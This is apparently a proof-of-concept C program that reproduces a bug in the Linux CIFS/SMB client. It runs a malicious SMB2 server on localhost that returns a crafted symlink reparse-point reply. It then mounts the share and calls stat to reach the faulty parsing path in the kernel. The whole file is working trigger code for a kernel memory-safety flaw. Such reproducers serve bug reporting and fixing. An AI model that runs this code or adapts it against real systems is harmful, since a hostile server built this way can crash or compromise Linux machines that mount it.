// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

static void p16(unsigned char *p, unsigned v) { p[0] = v & 0xff; p[1] = (v >> 8) & 0xff; }
static void p32(unsigned char *p, unsigned v)
{
	p[0] = v & 0xff; p[1] = (v >> 8) & 0xff;
	p[2] = (v >> 16) & 0xff; p[3] = (v >> 24) & 0xff;
}
static void p64(unsigned char *p, unsigned long long v)
{
	int i;
	for (i = 0; i < 8; i++)
		p[i] = (v >> (8 * i)) & 0xff;
}
static unsigned g16(const unsigned char *p) { return p[0] | (p[1] << 8); }
static unsigned g32(const unsigned char *p)
{
	return p[0] | (p[1] << 8) | (p[2] << 16) | ((unsigned)p[3] << 24);
}

#define SMB2_NEGOTIATE		0x00
#define SMB2_SESSION_SETUP	0x01
#define SMB2_LOGOFF		0x02
#define SMB2_TREE_CONNECT	0x03
#define SMB2_TREE_DISCONNECT	0x04
#define SMB2_CREATE		0x05
#define SMB2_CLOSE		0x06
#define SMB2_FLUSH		0x07
#define SMB2_READ		0x08
#define SMB2_WRITE		0x09
#define SMB2_LOCK		0x0a
#define SMB2_IOCTL		0x0b
#define SMB2_CANCEL		0x0c
#define SMB2_ECHO		0x0d
#define SMB2_QUERY_DIRECTORY	0x0e
#define SMB2_CHANGE_NOTIFY	0x0f
#define SMB2_QUERY_INFO		0x10
#define SMB2_SET_INFO		0x11

#define ST_SUCCESS			0x00000000u
#define ST_MORE_PROCESSING		0xC0000016u
#define ST_NOT_SUPPORTED		0xC00000BBu
#define ST_INVALID_PARAMETER		0xC000000Du
#define ST_NO_EAS_ON_FILE		0xC0000052u
#define ST_OBJECT_NAME_NOT_FOUND	0xC0000034u
#define ST_IO_REPARSE_TAG_NOT_HANDLED	0xC0000279u
#define ST_INVALID_DEVICE_REQUEST	0xC0000010u

#define FSCTL_GET_REPARSE_POINT		0x000900A8u
#define IO_REPARSE_TAG_SYMLINK		0xA000000Cu
#define FILE_OPEN_REPARSE_POINT		0x00200000u

#define ATTR_ARCHIVE			0x0020u
#define ATTR_DIRECTORY			0x0010u
#define ATTR_REPARSE_POINT		0x0400u

#define SMB21_PROT_ID			0x0210

#define SESSION_ID			0x0000000012340001ULL
#define TREE_ID				0x00000005u

#define SMALLBUF			448

static int xread(int fd, void *buf, size_t n)
{
	size_t done = 0;
	while (done < n) {
		ssize_t r = read(fd, (char *)buf + done, n - done);
		if (r <= 0)
			return -1;
		done += r;
	}
	return 0;
}

static int xwrite(int fd, const void *buf, size_t n)
{
	size_t done = 0;
	while (done < n) {
		ssize_t r = write(fd, (const char *)buf + done, n - done);
		if (r <= 0)
			return -1;
		done += r;
	}
	return 0;
}

static int send_pdu(int fd, const unsigned char *pdu, unsigned len)
{
	unsigned char hdr[4];
	hdr[0] = 0;
	hdr[1] = (len >> 16) & 0xff;
	hdr[2] = (len >> 8) & 0xff;
	hdr[3] = len & 0xff;
	if (xwrite(fd, hdr, 4) < 0)
		return -1;
	return xwrite(fd, pdu, len);
}

static void mkhdr(unsigned char *o, const unsigned char *req, unsigned status,
		  unsigned long long sess, unsigned tree)
{
	memset(o, 0, 64);
	o[0] = 0xFE; o[1] = 'S'; o[2] = 'M'; o[3] = 'B';
	p16(o + 4, 64);
	p16(o + 6, 0);
	p32(o + 8, status);
	p16(o + 12, g16(req + 12));
	p16(o + 14, 127);
	p32(o + 16, 0x00000001);
	p32(o + 20, 0);
	memcpy(o + 24, req + 24, 8);
	p32(o + 32, 0);
	p32(o + 36, tree);
	p64(o + 40, sess);
}

static unsigned mk_error(unsigned char *o, const unsigned char *req,
			 unsigned status, unsigned long long sess, unsigned tree)
{
	mkhdr(o, req, status, sess, tree);
	p16(o + 64, 9);
	o[66] = 0;
	o[67] = 0;
	p32(o + 68, 0);
	o[72] = 0;
	return 73;
}

struct srv {
	int fd;
	int sess_stage;
	int compound_failed;
	unsigned compound_status;
	int last_create_dir;
	int last_create_reparse;
	unsigned long long pfid, vfid;
	int reparse_served;
};

static unsigned long long FTIME = 0x01D8000000000000ULL;

static unsigned mk_negotiate(unsigned char *o, const unsigned char *req)
{
	mkhdr(o, req, ST_SUCCESS, 0, 0);
	p16(o + 64, 65);
	p16(o + 66, 0x0001);
	p16(o + 68, SMB21_PROT_ID);
	p16(o + 70, 0);
	memset(o + 72, 0x41, 16);
	p32(o + 88, 0);
	p32(o + 92, 65536 + 256);
	p32(o + 96, 65536 + 256);
	p32(o + 100, 65536 + 256);
	p64(o + 104, FTIME);
	p64(o + 112, FTIME);
	p16(o + 120, 128);
	p16(o + 122, 0);
	p32(o + 124, 0);
	o[128] = 0;
	return 129;
}

#define NTLMSSP_NEGOTIATE_UNICODE	0x00000001
#define NTLMSSP_REQUEST_TARGET		0x00000004
#define NTLMSSP_NEGOTIATE_NTLM		0x00000200
#define NTLMSSP_NEGOTIATE_ALWAYS_SIGN	0x00008000
#define NTLMSSP_TARGET_TYPE_SERVER	0x00020000
#define NTLMSSP_NEGOTIATE_EXTENDED_SEC	0x00080000
#define NTLMSSP_NEGOTIATE_TARGET_INFO	0x00800000
#define NTLMSSP_NEGOTIATE_128		0x20000000
#define NTLMSSP_NEGOTIATE_56		0x80000000

static unsigned mk_sess_challenge(unsigned char *o, const unsigned char *req)
{
	unsigned char *b;
	unsigned blob_off = 72, blob_len;

	mkhdr(o, req, ST_MORE_PROCESSING, SESSION_ID, 0);
	p16(o + 64, 9);
	p16(o + 66, 0);
	p16(o + 68, blob_off);

	b = o + blob_off;
	memset(b, 0, 64);
	memcpy(b, "NTLMSSP\0", 8);
	p32(b + 8, 2);

	p16(b + 12, 0); p16(b + 14, 0); p32(b + 16, 48);
	p32(b + 20, NTLMSSP_NEGOTIATE_UNICODE | NTLMSSP_REQUEST_TARGET |
		    NTLMSSP_NEGOTIATE_NTLM | NTLMSSP_NEGOTIATE_ALWAYS_SIGN |
		    NTLMSSP_TARGET_TYPE_SERVER | NTLMSSP_NEGOTIATE_EXTENDED_SEC |
		    NTLMSSP_NEGOTIATE_TARGET_INFO | NTLMSSP_NEGOTIATE_128 |
		    NTLMSSP_NEGOTIATE_56);
	memcpy(b + 24, "\x11\x22\x33\x44\x55\x66\x77\x88", 8);
	memset(b + 32, 0, 8);

	p16(b + 40, 4); p16(b + 42, 4); p32(b + 44, 48);
	p32(b + 48, 0);
	blob_len = 52;

	p16(o + 70, blob_len);
	return blob_off + blob_len;
}

static unsigned mk_sess_ok(unsigned char *o, const unsigned char *req)
{
	mkhdr(o, req, ST_SUCCESS, SESSION_ID, 0);
	p16(o + 64, 9);
	p16(o + 66, 0);
	p16(o + 68, 72);
	p16(o + 70, 0);
	o[72] = 0;
	return 73;
}

static unsigned mk_tree_connect(unsigned char *o, const unsigned char *req)
{
	mkhdr(o, req, ST_SUCCESS, SESSION_ID, TREE_ID);
	p16(o + 64, 16);
	o[66] = 1;
	o[67] = 0;
	p32(o + 68, 0);
	p32(o + 72, 0);
	p32(o + 76, 0x001f01ff);
	return 80;
}

static unsigned mk_create_ok(unsigned char *o, const unsigned char *req,
			     unsigned attrs, unsigned long long pfid,
			     unsigned long long vfid)
{
	mkhdr(o, req, ST_SUCCESS, SESSION_ID, TREE_ID);
	p16(o + 64, 89);
	o[66] = 0;
	o[67] = 0;
	p32(o + 68, 1);
	p64(o + 72, FTIME);
	p64(o + 80, FTIME);
	p64(o + 88, FTIME);
	p64(o + 96, FTIME);
	p64(o + 104, 0);
	p64(o + 112, 0);
	p32(o + 120, attrs);
	p32(o + 124, 0);
	p64(o + 128, pfid);
	p64(o + 136, vfid);
	p32(o + 144, 0);
	p32(o + 148, 0);
	o[152] = 0;
	return 153;
}

static void fill_all_info(unsigned char *d, unsigned attrs, int is_dir)
{
	memset(d, 0, 104);
	p64(d + 0, FTIME);
	p64(d + 8, FTIME);
	p64(d + 16, FTIME);
	p64(d + 24, FTIME);
	p32(d + 32, attrs);
	p32(d + 36, 0);
	p64(d + 40, 0);
	p64(d + 48, 0);
	p32(d + 56, 1);
	d[60] = 0;
	d[61] = is_dir ? 1 : 0;
	p16(d + 62, 0);
	p64(d + 64, is_dir ? 2 : 3);
	p32(d + 72, 0);
	p32(d + 76, 0x001f01ff);
	p64(d + 80, 0);
	p32(d + 88, 0);
	p32(d + 92, 1);
	p32(d + 96, 0);
	p32(d + 100, 0);
}

static unsigned mk_query_info_ok(unsigned char *o, const unsigned char *req,
				 const unsigned char *data, unsigned dlen)
{
	mkhdr(o, req, ST_SUCCESS, SESSION_ID, TREE_ID);
	p16(o + 64, 9);
	p16(o + 66, 72);
	p32(o + 68, dlen);
	memcpy(o + 72, data, dlen);
	return 72 + dlen;
}

static unsigned mk_close_ok(unsigned char *o, const unsigned char *req)
{
	mkhdr(o, req, ST_SUCCESS, SESSION_ID, TREE_ID);
	p16(o + 64, 60);
	p16(o + 66, 0);
	p32(o + 68, 0);
	p64(o + 72, FTIME);
	p64(o + 80, FTIME);
	p64(o + 88, FTIME);
	p64(o + 96, FTIME);
	p64(o + 104, 0);
	p64(o + 112, 0);
	p32(o + 120, 0);
	return 124;
}

static unsigned mk_reparse_ioctl(unsigned char *o, const unsigned char *req,
				 unsigned long long pfid, unsigned long long vfid)
{
	memset(o, 0, SMALLBUF);
	mkhdr(o, req, ST_SUCCESS, SESSION_ID, TREE_ID);
	p16(o + 64, 49);
	p16(o + 66, 0);
	p32(o + 68, FSCTL_GET_REPARSE_POINT);
	p64(o + 72, pfid);
	p64(o + 80, vfid);
	p32(o + 88, 0);
	p32(o + 92, 0);
	p32(o + 96, SMALLBUF - 8);
	p32(o + 100, 8);
	p32(o + 104, 0);
	p32(o + 108, 0);

	memset(o + 112, 0x00, SMALLBUF - 8 - 112);

	p32(o + SMALLBUF - 8, IO_REPARSE_TAG_SYMLINK);
	p16(o + SMALLBUF - 4, 0);
	p16(o + SMALLBUF - 2, 0);

	return SMALLBUF;
}

static int handle_one(struct srv *s, const unsigned char *req, unsigned reqlen)
{
	static unsigned char out[70000];
	unsigned olen = 0;
	unsigned cmd = g16(req + 12);

	if (s->compound_failed && cmd != SMB2_CREATE && cmd != SMB2_CLOSE) {
		olen = mk_error(out, req, s->compound_status, SESSION_ID, TREE_ID);
		return send_pdu(s->fd, out, olen);
	}

	switch (cmd) {
	case SMB2_NEGOTIATE:
		olen = mk_negotiate(out, req);
		break;

	case SMB2_SESSION_SETUP:
		if (s->sess_stage == 0) {
			olen = mk_sess_challenge(out, req);
			s->sess_stage = 1;
		} else {
			olen = mk_sess_ok(out, req);
		}
		break;

	case SMB2_TREE_CONNECT:
		olen = mk_tree_connect(out, req);
		break;

	case SMB2_TREE_DISCONNECT:
		mkhdr(out, req, ST_SUCCESS, SESSION_ID, TREE_ID);
		p16(out + 64, 4);
		p16(out + 66, 0);
		olen = 68;
		break;

	case SMB2_LOGOFF:
		mkhdr(out, req, ST_SUCCESS, SESSION_ID, 0);
		p16(out + 64, 4);
		p16(out + 66, 0);
		olen = 68;
		break;

	case SMB2_ECHO:
		mkhdr(out, req, ST_SUCCESS, SESSION_ID, 0);
		p16(out + 64, 4);
		p16(out + 66, 0);
		olen = 68;
		break;

	case SMB2_CREATE: {
		unsigned copts = g32(req + 64 + 40);
		unsigned nlen = g16(req + 64 + 46);

		if (nlen == 0) {

			s->last_create_dir = 1;
			s->last_create_reparse = 0;
			s->pfid = 0x1111; s->vfid = 0x2222;
			olen = mk_create_ok(out, req, ATTR_DIRECTORY,
					    s->pfid, s->vfid);
		} else if (copts & FILE_OPEN_REPARSE_POINT) {

			s->last_create_dir = 0;
			s->last_create_reparse = 1;
			s->pfid = 0x3333; s->vfid = 0x4444;
			olen = mk_create_ok(out, req,
					    ATTR_ARCHIVE | ATTR_REPARSE_POINT,
					    s->pfid, s->vfid);
		} else {

			s->compound_failed = 1;
			s->compound_status = ST_IO_REPARSE_TAG_NOT_HANDLED;
			olen = mk_error(out, req, ST_IO_REPARSE_TAG_NOT_HANDLED,
					SESSION_ID, TREE_ID);
		}
		break;
	}

	case SMB2_QUERY_INFO: {
		unsigned info_type = req[64 + 2];
		unsigned info_class = req[64 + 3];

		if (info_type == 0x01 && info_class == 18) {
			unsigned char d[104];
			unsigned attrs = s->last_create_dir ? ATTR_DIRECTORY :
				(ATTR_ARCHIVE | ATTR_REPARSE_POINT);
			fill_all_info(d, attrs, s->last_create_dir);
			olen = mk_query_info_ok(out, req, d, sizeof(d));
		} else if (info_type == 0x01 && info_class == 15) {
			olen = mk_error(out, req, ST_NO_EAS_ON_FILE,
					SESSION_ID, TREE_ID);
		} else {
			olen = mk_error(out, req, ST_INVALID_PARAMETER,
					SESSION_ID, TREE_ID);
		}
		break;
	}

	case SMB2_IOCTL: {
		unsigned ctl = g32(req + 64 + 4);

		if (ctl == FSCTL_GET_REPARSE_POINT) {
			s->reparse_served++;
			olen = mk_reparse_ioctl(out, req, s->pfid, s->vfid);
		} else {
			olen = mk_error(out, req, ST_INVALID_DEVICE_REQUEST,
					SESSION_ID, TREE_ID);
		}
		break;
	}

	case SMB2_CLOSE:
		olen = mk_close_ok(out, req);
		break;

	case SMB2_CANCEL:
		return 0;

	default:
		olen = mk_error(out, req, ST_NOT_SUPPORTED, SESSION_ID, TREE_ID);
		break;
	}

	if (!olen)
		return 0;
	return send_pdu(s->fd, out, olen);
}

static void serve(int cfd)
{
	struct srv s;
	static unsigned char msg[1 << 20];

	memset(&s, 0, sizeof(s));
	s.fd = cfd;

	for (;;) {
		unsigned char lh[4];
		unsigned mlen, off;

		if (xread(cfd, lh, 4) < 0)
			return;
		mlen = (lh[1] << 16) | (lh[2] << 8) | lh[3];
		if (mlen < 64 || mlen > sizeof(msg))
			return;
		if (xread(cfd, msg, mlen) < 0)
			return;

		s.compound_failed = 0;
		off = 0;
		for (;;) {
			unsigned next;

			if (off + 64 > mlen)
				break;
			if (memcmp(msg + off, "\xfeSMB", 4) != 0)
				break;
			next = g32(msg + off + 20);

			if (handle_one(&s, msg + off, mlen - off) < 0)
				return;

			if (!next || off + next >= mlen)
				break;
			off += next;
		}
	}
}

static void server_main(int lfd)
{
	for (;;) {
		int cfd = accept(lfd, NULL, NULL);
		if (cfd < 0) {
			if (errno == EINTR)
				continue;
			return;
		}
		{
			int one = 1;
			setsockopt(cfd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
		}
		serve(cfd);
		close(cfd);
	}
}

int main(void)
{
	int lfd, one = 1;
	struct sockaddr_in sa;
	pid_t pid;
	struct stat st;

	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
	signal(SIGPIPE, SIG_IGN);

	lfd = socket(AF_INET, SOCK_STREAM, 0);
	if (lfd < 0) {
		perror("socket");
		return 1;
	}
	setsockopt(lfd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));

	memset(&sa, 0, sizeof(sa));
	sa.sin_family = AF_INET;
	sa.sin_port = htons(445);
	sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	if (bind(lfd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
		perror("bind");
		return 1;
	}
	if (listen(lfd, 8) < 0) {
		perror("listen");
		return 1;
	}

	pid = fork();
	if (pid == 0) {

		int nul = open("/dev/null", O_WRONLY);
		if (nul >= 0) {
			dup2(nul, 1);
			dup2(nul, 2);
		}
		server_main(lfd);
		_exit(0);
	}
	close(lfd);

	if (mkdir("./mnt", 0755) < 0 && errno != EEXIST)
		printf("[poc] mkdir: %s\n", strerror(errno));

	{
		const char *opts = "ip=127.0.0.1,user=u,pass=p,vers=2.1,"
				   "sec=ntlmssp,noserverino,actimeo=0,"
				   "echo_interval=60,hard";
		int rc = mount("//127.0.0.1/share", "./mnt", "cifs", 0, opts);
		printf("[poc] mount rc=%d errno=%d (%s)\n", rc, errno, strerror(errno));
		if (rc < 0) {
			kill(pid, SIGKILL);
			return 1;
		}
	}

	printf("[poc] triggering: stat(./mnt/t)\n");
	fflush(stdout);
	errno = 0;
	if (stat("./mnt/t", &st) < 0)
		printf("[poc] stat failed: %s\n", strerror(errno));
	else
		printf("[poc] stat ok mode=%o\n", st.st_mode);

	umount2("./mnt", MNT_DETACH);
	kill(pid, SIGKILL);
	waitpid(pid, NULL, 0);
	printf("[poc] done\n");
	return 0;
}
